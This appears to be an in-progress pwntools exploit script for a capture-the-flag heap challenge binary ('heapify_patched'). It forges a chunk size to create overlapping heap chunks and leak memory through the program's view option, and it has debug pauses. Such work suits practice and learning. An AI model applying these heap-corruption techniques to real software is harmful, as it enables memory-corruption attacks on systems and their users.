from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]


def get_remote():
    p = process("./heapify_patched")
    if args.GDB:
        gdb.attach(p)
    return p


def alloc(r, size, data):
    r.recvuntil(b"your choice: ")
    r.sendline(b"1")
    r.recvuntil(b"chunk size: ")
    r.sendline(str(size).encode())
    r.recvuntil(b"chunk data: ")
    r.send(data)


def free(r, idx):
    r.recvuntil(b"your choice: ")
    r.sendline(b"2")
    r.recvuntil(b"chunk index: ")
    r.sendline(str(idx).encode())


def view(r, idx):
    r.recvuntil(b"your choice: ")
    r.sendline(b"3")
    r.recvuntil(b"chunk index: ")
    r.sendline(str(idx).encode())
    data = r.recvuntil(b"\nyour choice: ", drop=True)
    r.unrecv(b"your choice: ")
    return data


def main():
    r = get_remote()

    alloc(r, 0x80, b"aaaa\n")  # 0
    # -- stdin buffer gets allocated --
    big_size = 0x120
    med_size = 0x90
    alloc(r, med_size - 8, b"bbbb\n")  # 1
    alloc(r, big_size - 8, b"cccc\n")  # 2
    alloc(r, med_size - 8, b"dddd\n")  # 3
    # grab 1 back from the tcache
    free(r, 1)
    evil_size = big_size + med_size # sizeof(2) + sizeof(3)
    alloc(r, med_size - 8, flat({med_size - 0x10: [pack(0), pack(evil_size | 0x1)]}) + b"\n") # 4
    input("1")
    free(r, 2)
    input("2")
    alloc(r, evil_size - 8, flat({big_size - 0x10: [pack(0x0101010101010101), pack(0x0101010101010101 | med_size)]}) + b"\n") # 5
    #alloc(r, evil_size - 8, b"eeee\n")
    input("3")
    free(r, 3)
    input("4")
    print(view(r, 5))
    input("end")

    return


if __name__ == "__main__":
    main()
